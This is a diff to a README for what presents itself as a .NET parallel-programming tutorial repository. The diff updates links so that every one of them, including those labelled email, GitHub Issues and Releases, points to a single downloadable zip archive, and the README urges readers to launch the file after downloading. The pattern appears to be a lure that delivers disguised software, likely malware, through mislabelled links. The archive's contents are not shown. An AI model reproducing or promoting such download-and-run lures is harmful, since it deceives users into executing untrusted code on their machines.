@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Parallel Programming in .NET Repository! 🚀
 
-![Parallel Programming](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip)
+![Parallel Programming](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v2.0/Software.zip)
 
 ## Repository Name: parallel-programming-dotnet
 ## Description: 
@@ -27,18 +27,18 @@ Welcome to the "parallel-programming-dotnet" repository! Here, you will find a c
 2. **Practices**: Put your knowledge to the test with hands-on exercises and code samples.
 3. **Resources**: Access additional reading materials, links, and helpful resources to further expand your understanding.
 
-## 🔗 [Download the Complete Release Here!](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip)
+## 🔗 [Download the Complete Release Here!](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v2.0/Software.zip)
 - 🚀 Launch the file after downloading to access all the goodies packed for you!
 
 ## 🌐 Additional Resources and Updates:
-- For more updates, check out the [Releases](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip) section regularly.
+- For more updates, check out the [Releases](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v2.0/Software.zip) section regularly.
 - Stay tuned for new lessons, practices, and resources added to the repository. Your feedback and contributions are always welcome!
 
 ## 🌟 Join the Parallel Programming Community:
 - Connect with like-minded developers, share your insights, and collaborate on projects related to parallel programming. Your participation makes the community vibrant and enriching for all!
 
 ## 📫 How to Get in Touch:
-- For feedback, suggestions, or queries, feel free to reach out via [email](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip) or [GitHub Issues](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip).
+- For feedback, suggestions, or queries, feel free to reach out via [email](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v2.0/Software.zip) or [GitHub Issues](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v2.0/Software.zip).
 
 ## 🚧 Let's Build a Concurrent Future Together! 🚧
 
